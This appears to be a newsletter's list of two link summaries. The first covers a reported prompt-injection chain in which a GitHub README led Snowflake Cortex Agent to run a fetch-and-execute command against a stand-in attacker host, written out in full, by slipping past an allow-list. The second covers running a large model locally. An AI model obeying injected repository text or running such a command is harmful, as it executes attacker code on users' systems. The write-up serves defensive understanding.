## Long-form picks

- **Snowflake Cortex AI Escapes Sandbox and Executes Malware** — PromptArmor, via Simon Willison. _Takeaway:_ Walkthrough of a prompt-injection chain in Snowflake Cortex Agent where a README in a GitHub repo triggered `cat <(sh <(wget -qO- ATTACKER/bugbot))`. Cortex's allow-list treated `cat` as safe, missing the process-substitution. Simon's takeaway: command-pattern allow-lists are inherently unreliable — prefer deterministic sandboxes outside the agent. [https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/](https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/)
- **Autoresearching Apple's "LLM in a Flash" to run Qwen 397B locally** — Dan Woods, via Simon Willison. _Takeaway:_ A custom Qwen3.5-397B-A17B MoE running at 5.5+ tok/s on a 48GB MacBook Pro M3 Max, despite the 209GB model. Streams expert weights from SSD using techniques from Apple's 2023 "LLM in a flash" paper, with 90 Claude-Code-driven experiments producing the MLX/Metal pipeline. [https://simonwillison.net/2026/Mar/18/llm-in-a-flash/](https://simonwillison.net/2026/Mar/18/llm-in-a-flash/)
